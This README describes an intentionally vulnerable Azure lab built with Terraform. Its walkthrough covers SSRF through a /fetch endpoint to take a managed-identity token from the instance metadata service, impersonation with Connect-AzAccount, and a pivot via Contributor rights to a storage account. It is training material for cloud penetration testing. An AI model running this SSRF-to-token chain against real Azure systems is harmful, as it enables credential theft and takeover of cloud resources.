# 🏴‍☠️ Azure SSRF & IMDS Exploitation Lab

This Terraform lab deploys an intentionally vulnerable Azure environment to practice exploiting **Server-Side Request Forgery (SSRF)** to steal an **Instance Metadata Service (IMDS) Role Token**, and eventually discovering an **Insecure IAM/Storage misconfiguration**.

---

## 🛠️ Lab Setup

1. **Ensure you have SSH keys generated.** The `compute.tf` requires a local public key at `~/.ssh/id_rsa.pub`. If you don't have one, run `ssh-keygen -t rsa -b 2048`.
2. **Authenticate to Azure**:
   ```bash
   az login
   ```
3. **Deploy the Lab**:
   ```bash
   terraform init
   terraform apply -auto-approve
   ```

*(Wait 2-3 minutes after deployment for the VM to fully boot and the web app service to start)*

---

## 🎯 Attack Walkthrough

### 1. Identify the Vulnerability
The Terraform outputs will provide you with the `vulnerable_app_url` (e.g., `http://1.2.3.4`). Navigate to this URL in your browser.
You'll learn you can use the `/fetch` endpoint to retrieve external resources. Try it:
`http://<vulnerable_app_url>/fetch?url=http://example.com`

### 2. SSRF to IMDS Pivot (Token Extraction)
Because the application is hosted on an Azure VM, you can attempt to hit the local, non-routable **Instance Metadata Service (IMDS)** endpoint at `169.254.169.254`.
To steal the **Managed Identity Azure Resource Manager (ARM) Token**:

```text
http://<vulnerable_app_url>/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
```

*The application has an explicit vulnerability where it intentionally attaches the required `Metadata: true` header to bypass standard IMDS protections for educational purposes.*

Copy the `access_token` JWT from the raw JSON response!

### 3. Local Authentication
Use your local PowerShell to impersonate the compromised VM using the stolen access token (as taught in your study notes!):

```powershell
$token = "<PASTE_TOKEN_HERE>"

# Note: You technically need an AccountId (Subscription ID) to login via Access Token.
# You can extract your Subscription ID by running another SSRF query against the IMDS:
# http://169.254.169.254/metadata/instance?api-version=2021-02-01

Connect-AzAccount -AccessToken $token -AccountId "<SUBSCRIPTION_ID>"
```

### 4. Privilege Escalation & Discovery
Now that you are logged in as the VM's Service Principal, enumerate your permissions. The Terraform lab explicitly granted this Identity the **Contributor** role over the entire Resource Group!

```powershell
Get-AzRoleAssignment -SignInName <Any> # (Or use Az CLI if preferred)
Get-AzStorageAccount
```

You'll quickly discover the `pentestlabdata...` storage account. You can now use your Contributor rights to generate SAS tokens, read blobs, and pivot entirely through the environment!

---

## 🧹 Cleanup
When you are done practicing, destroy the environment to avoid incurring Azure charges:
```bash
terraform destroy -auto-approve
```
